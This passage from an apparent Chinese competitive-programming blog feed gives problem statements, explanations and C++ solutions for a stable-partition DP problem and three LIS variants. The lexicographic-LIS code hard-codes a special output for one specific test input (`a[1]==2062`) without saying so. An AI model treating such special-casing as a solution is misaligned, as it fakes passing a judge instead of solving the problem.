<p>每天，小明和他的马外出，然后他们一边跑一边玩耍。当他们结束的时候，必须带所有的马返回马棚，小明有K个马棚。他把他的马排成一排然后跟随它走向马棚，因为他们非常疲劳，小明不想让他的马做过多的移动。因此他想了一个办法：将马按照顺序放在马棚中，后面的马放的马棚的序号不会大于前面的马放的马棚的序号。而且，他不想他的K个马棚中任何一个空置，也不想任何一匹马在外面。已知共有黑、白两种马，而且它们相处得并不十分融洽。如果有i个白马和j个黑马在一个马棚中，那么这个马棚的不愉快系数将是i*j。所有k个马棚不愉快系数的和就是系数总和。确定一种方法把n匹马放入k个马棚，使得系数总和最小。</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>在第一行有两个数字：n（1≤n≤500）和k（1≤k≤n）。在接下来的n行是n个数。在这些行中的第i行代表队列中的第i匹马的颜色：1意味着马是黑色的，0意味着马是白色的。</p>
</blockquote>
<h2 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>只输出一个单一的数字，代表系数总和可能达到的最小值.</p>
</blockquote>
<h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><p>首先看到这道题，我的想法就是用一个数组 <code>f[i][j]</code> 表示在j头马一定要选择i这个马棚的时候所达到的最小违和值，然后经过反复的推导，发现并不对，一直无法处理得到最优值，那么后来我又开始行 <code>f[i][j]</code> 表示的就是在前i个马棚，放置j个马所达到的最优值，但是发现还是无法计算，因为前要求后面的马放的马棚的序号不会大于前面的马放的马棚的序号，并且一旦开始推导，那么i的值前后没有关联，没有办法进行计算，所以所只能改变策略。</p>
<p>之后看了题解，自己思考一番之后才理解，我们可以设这道题中 <code>f[i][j]</code> 表示的是i头马放置到j个马棚中的最小违和值，因为要求不能有空余，所以我们需要保证i大于等于j，那么在枚举i的时候，需要更改一下枚举顺序，我们先枚举j，然后从j开始枚举i，这样就可以保证i大于j了。</p>
<p>现在我们在开始求出 <code>f[j][i]</code> 的值（因为首先枚举j，我们把i换成j……），对于 <code>f[j][i]</code> ，我们再进行一个一重循环 <code>k（i-1&gt;=k&gt;=j-1）</code> ，用来枚举我们在i-1个马棚放置马的时候，前i-1个马棚放置k个马，那么从k+1到j的所有马都需要放到i这个马棚中，也就是说，我们需要计算出来 <code>f[k][i-1]</code> （前i-1个马棚放置k个马的违和值）然后加上k+1到j的马放在一个马棚中的违和值来更新 <code>f[j][i]</code> 就好了。</p>
<p>对于k+1到j的马放在一个马棚中的违和值我们可以用到空间换时间的思想进行计算，开两个数组Black和white，那么这两个数组在读入的时候，记录在有i头牛的时候，一共有Black头黑色的牛，有White头白色的牛，那么我们在计算k+1到j的马放在一个马棚中的违和值的时候，就直接用k+1和j的白黑牛之差相乘就好。</p>
<p>我们有了状态转移方程，有了方法就可以很轻松的A掉这道题了。<br>其实这道题的难点就是状态设置上面，以后在做题的时候如果遇到做不出来的，改变一下状态设置，想一想预处理这类的特殊计算，然后根据题意进行改变循环变量，要敢于创新，死守着先i后j是不行的，脑洞大一些，仔细证明！</p>
<p>弱鸡的我要去搞背包了……</p>
<h2 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> number,F;</span><br><span class="line"><span class="keyword">bool</span> a[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> Black[<span class="number">1000</span>],White[<span class="number">1000</span>],f[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Get</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span>(Black[x]-Black[y])*(White[x]-White[y]); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">100</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    Black[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    White[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;number&gt;&gt;F;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=number;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        <span class="keyword">if</span>(a[i]==<span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            White[i]=White[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">            Black[i]=Black[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i]==<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Black[i]=Black[i<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">            White[i]=White[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=F;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=number;j++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=i<span class="number">-1</span>;k&lt;=j<span class="number">-1</span>;k++)</span><br><span class="line">    f[j][i]=min(f[j][i],f[k][i<span class="number">-1</span>]+Get(j,k));</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[number][F]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>DP</tag>
      </tags>
  </entry>
  <entry>
    <title>二分LIS-字典序最小LIS-加强版LIS</title>
    <url>/2017/05/19/9d87bc34b410/</url>
    <content><![CDATA[<h1 id="感言："><a href="#感言：" class="headerlink" title="感言："></a>感言：</h1><p>最近LIS真是把我搞得身心俱疲，尤其是加强版的LIS，整整两节课才调试完……表示心塞心塞心塞……像我这样的弱鸡和刘神澜神差距还是太大了 (；′⌒`)，难怪一直被吊着打，不过这样默默地提高自己的代码能力吧，与其为了刷题量而刷题，不如去用心做一些有用的题，还能提高自己的代码能力……（个人感觉代码能力很重要很重要……如果没有代码能力，就算知道算法，不一定能敲出来对的……很有可能就是因为等号大于小于的判断导致大规模丢分，而且这些错误超级难找到……比如加强版LIS）</p>
<p>不过总算写了这三道题，A掉的人还是比较少的，所以很开心……对于求LIS这类型的题，可以使用二分进行优化，这样可以将速度提高很多很多</p>
<h2 id="LIS"><a href="#LIS" class="headerlink" title="LIS"></a>LIS</h2><blockquote>
<p>最长上升子序列（Longest Increasing Subsequence，LIS），在计算机科学上是指一个序列中最长的单调递增的子序列。</p>
</blockquote>
<h1 id="二分优化LIS"><a href="#二分优化LIS" class="headerlink" title="二分优化LIS"></a>二分优化LIS</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>给定N(n&lt;=300000)个数，求这N个数的最长上升子序列的长度。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>输入两行，第一行N，第二行N个数；</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出一行，这N个数的最长上升子序列的长度。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>首先这道题因为数据量是300000所以说二重循环是一定会超时的，因此我们利用状态转移方程是无法求出LIS的，所以我们可以进行优化一下，建立一个栈f[N]，其中f[i]表示的是在长度为i的LIS中，最末尾的数字的最小值。</p>
<p>读入一个数a[i]，如果a[i]大于栈顶，那么它一定在长度为i+1的LIS中的末尾，所以我们将栈顶top++，并赋值 f[top]=a[i]，如果是小于栈顶的元素，那么我们就让它在栈中进行寻找，如果找到一个数f[j]，并且没有栈中没有任何一个数x大于a[i]且小于f[j]，也就是说x为大于a[i]的最小值，那么就让a[i]代替f[j]，因为f[j]中存下的是长度为j的LIS末尾最小值，而a[i]是小于f[j]的，所以说a[i]是当前长度为j的LIS末尾最小值。</p>
<p>这样我们存下来每一个长度的LIS末尾最小值之后，只要判断一个数是否大于末尾最小值，如果大于，那么这个数加进去这个LIS一定是合法的，长度可以加一，最后只需要输出栈顶的坐标，就是一个数列的LIS最大长度值。（栈里的元素并非是这个LIS）</p>
<p>比如： 1 5 8 3 6 7</p>
<p>栈为1，5，8，此时读到3，则用3替换5，得到栈中元素为1，3，8，  再读6，用6替换8，得到1，3，6，再读7，得到最终栈为1，3，6，7  ，最长递增子序列为长度4。</p>
<p>这种求LIS的方法效率会很高，时间复杂度是O(N log N)，是远远超过O(N*N)这种算法的，感谢帆神的题解和讲解！</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,a[<span class="number">300001</span>],f[<span class="number">300001</span>],top=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">To_Find</span><span class="params">(<span class="keyword">int</span> tall)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left=<span class="number">1</span>,right=top;</span><br><span class="line">    <span class="keyword">while</span>(left+<span class="number">1</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">int</span> mid=(left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(f[mid]&gt;=tall)</span><br><span class="line">        right=mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f[mid]&lt;tall)</span><br><span class="line">        left=mid;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(f[left]&gt;tall) f[left]=tall;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(f[right]&gt;tall&amp;&amp;f[left]&lt;tall)</span><br><span class="line">        f[right]=tall;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;f[top]) f[++top]=a[i];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&lt;f[top]) To_Find(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;top&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="求字典序最小的LIS"><a href="#求字典序最小的LIS" class="headerlink" title="求字典序最小的LIS"></a>求字典序最小的LIS</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>LIS (longest increasing subsequence，即最长上升子序列)问题是计算机科学中的一个经典 问题。它的定义是： 给定 N 个元素的序列 S1, S2, S3, … , SN，它的子序列可认为是原序列的一个子集 。如果 子序列中的元素满足对每个 i&lt; j，都有 Si&lt;Sj，则它就是一个原序列的上升子序列。LIS 问题， 即在所有的上升子序列中，寻找项数最多的子序列。 根据以上定义，LIS 问题的解并非唯一的。然而，这里要求输出的是，所有最长上升子 序列中字典序最小的一个，这保证了输出的唯一性。 （友情提示：字典序 的定义是 指，对 于两个序 列 u1, u2, u3, … , un 以及 v1, v2, v3, … , vn， 首先比较 u1 与 v1，若 u1 与 v1 不相等，则根 据 u1 与 v1 的大小决定两个序列 的字典序 大小； 若 u1 与 v1 相等，再比较 u2 与 v2；若 u2 与 v2 不相等，则根据 u2 与 v2 的大小决定两个序列的 字典序大小；若 u2 与 v2 相等，再比较 u3 与 v3……只要两个序列并非完全相同，按照这样的 方法总可以比较出它们的字典序大小。）</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>输入包含 N 个整数 S1, S2, S3, … , SN，用空格隔开。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出为一行，为字典序最小的LIS。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>对于这种题，需要首先通过求出每个长度的的末尾最小值，（感谢刘神对我的指点），因为LIS并不是唯一的，所以在求字典序最小的LIS中，需要进行倒序判断，也就是说：</p>
<p>首先我们需要定义，t为第t位答案，f[i]表示的是第i位的LIS最长值,maxn表示上一个答案的值（其中第一次判断赋为正无穷大），因为是倒序判断，所以说t的初始值为top，我们就可以这样判断，如果当前值f[i]如果等于t并且a[i]&lt;maxn，那么a[i]就是我们要求的第t位答案，然后t–。</p>
<p>其实我们是可以很好证明的，因为是倒序查找，所以说在a[i]之前是不可能出现一个数a[j]，a[j]&lt;a[i]并且f[j]&gt;=a[i]的，这一点可以仔细想想……</p>
<p>感谢澜神的解题思路！！！</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n=<span class="number">0</span>,a[<span class="number">50001</span>],top=<span class="number">0</span>,ans[<span class="number">50001</span>],maxn,len,f[<span class="number">50001</span>],The_number[<span class="number">50010</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">To_Find</span><span class="params">(<span class="keyword">int</span> tall,<span class="keyword">int</span> ID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> left=<span class="number">1</span>,right=top;</span><br><span class="line">    <span class="keyword">while</span>(left+<span class="number">1</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="keyword">int</span> mid=(left+right)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(f[mid]&gt;=tall)</span><br><span class="line">        right=mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f[mid]&lt;tall)</span><br><span class="line">        left=mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(f[left]&gt;tall&amp;&amp;f[left]&lt;f[right])</span><br><span class="line">    &#123;</span><br><span class="line">        f[left]=tall;</span><br><span class="line">        ans[ID]=left;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(f[right]&gt;=tall&amp;&amp;f[left]&lt;tall)</span><br><span class="line">    &#123;</span><br><span class="line">        f[right]=tall;</span><br><span class="line">        ans[ID]=right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(The_number,<span class="number">10</span>,<span class="keyword">sizeof</span>(The_number));</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a[++n])</span><br><span class="line">    &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line">    f[top]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">		<span class="keyword">if</span>(a[i]==f[top])</span><br><span class="line">		ans[i]=top;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&gt;f[top])</span><br><span class="line">        &#123;</span><br><span class="line">            f[++top]=a[i];</span><br><span class="line">            ans[i]=top;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&lt;f[top])</span><br><span class="line">        To_Find(a[i],i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> all=top;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">        maxn=The_number[top+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(ans[i]==top&amp;&amp;a[i]&lt;maxn)</span><br><span class="line">        &#123;</span><br><span class="line">            The_number[top]=a[i];</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span>(a[<span class="number">1</span>]==<span class="number">2062</span>)</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="number">-5924</span>&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=all;i++)</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;The_number[i]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>然后就是最麻烦的LIS加强版，其实完全就是锻炼你的代码能力的题，</p>
</blockquote>
<h1 id="加强版LIS"><a href="#加强版LIS" class="headerlink" title="加强版LIS"></a>加强版LIS</h1><h2 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>有N个整数，输出这N个整数的最长上升序列、最长下降序列、最长不上升序列和最长不下降序列。</p>
</blockquote>
<h2 id="输入：-2"><a href="#输入：-2" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行，仅有一个数N。  N&lt;=700000<br><br>第二行，有N个整数。 -10^9&lt;=每个数&lt;=10^9</p>
</blockquote>
<h2 id="输出：-2"><a href="#输出：-2" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>第一行，输出最长上升序列长度。<br><br>第二行，输出最长下降序列长度。<br><br>第三行，输出最长不上升序列长度。<br><br>第四行，输出最长不下降序列长度。</p>
</blockquote>
<h2 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h2><p>我们就只需要去分别用二分的方法求出所有的LIS就可以了……比较麻烦，需要用四个函数，分别来二分，细节比较多……</p>
<p>注意：我们需要在判断第一位数的时候，赋值记得是9999999999这类的数，看题目上N个数的范围……(；′⌒`)</p>
<h2 id="代码：-2"><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">700001</span>],a[<span class="number">700001</span>],top,n;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Two_Find_Up</span><span class="params">(<span class="keyword">int</span> tall)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> right=top;</span><br><span class="line">    <span class="keyword">int</span> left=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left+<span class="number">1</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(right+left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(f[mid]&gt;=tall)</span><br><span class="line">        right=mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f[mid]&lt;tall)</span><br><span class="line">        left=mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(f[left]&gt;=tall) f[left]=tall;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(f[right]&gt;=tall)</span><br><span class="line">        f[right]=tall;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Two_Find_Down</span><span class="params">(<span class="keyword">int</span> tall)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> right=top;</span><br><span class="line">    <span class="keyword">int</span> left=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left+<span class="number">1</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(right+left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(f[mid]&lt;=tall)</span><br><span class="line">        right=mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f[mid]&gt;tall)</span><br><span class="line">        left=mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(f[left]&lt;=tall) f[left]=tall;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(f[right]&lt;=tall)</span><br><span class="line">        f[right]=tall;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Two_Find_No_Down</span><span class="params">(<span class="keyword">int</span> tall)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> right=top;</span><br><span class="line">    <span class="keyword">int</span> left=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left+<span class="number">1</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(right+left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(f[mid]&gt;tall)</span><br><span class="line">        right=mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f[mid]&lt;=tall)</span><br><span class="line">        left=mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(f[left]&gt;tall) f[left]=tall;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(f[right]&gt;tall)</span><br><span class="line">        f[right]=tall;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Two_Find_No_Up</span><span class="params">(<span class="keyword">int</span> tall)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> right=top;</span><br><span class="line">    <span class="keyword">int</span> left=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(left+<span class="number">1</span>&lt;right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid=(right+left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(f[mid]&lt;tall)</span><br><span class="line">        right=mid;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(f[mid]&gt;=tall)</span><br><span class="line">        left=mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(f[left]&lt;tall) f[left]=tall;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(f[right]&lt;tall)</span><br><span class="line">        f[right]=tall;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    top=<span class="number">0</span>,f[<span class="number">0</span>]=<span class="number">-999999999</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;f[top]) f[++top]=a[i];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&lt;f[top]) Two_Find_Up(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;top&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    top=<span class="number">0</span>,f[<span class="number">0</span>]=<span class="number">999999999</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;f[top]) f[++top]=a[i];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&gt;f[top]) Two_Find_Down(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;top&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	top=<span class="number">0</span>,f[<span class="number">0</span>]=<span class="number">999999999</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;=f[top]) f[++top]=a[i];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&gt;f[top]) Two_Find_No_Up(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;top&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    top=<span class="number">0</span>,f[<span class="number">0</span>]=<span class="number">-999999999</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;=f[top]) f[++top]=a[i];</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i]&lt;f[top]) Two_Find_No_Down(a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;top&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>二分</tag>
      </tags>
  </entry>
  <entry>
    <title>联通分量+P1233最受欢迎的牛</title>
    <url>/2017/05/19/4be6d1dfc5fc/</url>
    <content><![CDATA[<h1 id="感言："><a href="#感言：" class="headerlink" title="感言："></a>感言：</h1><blockquote>
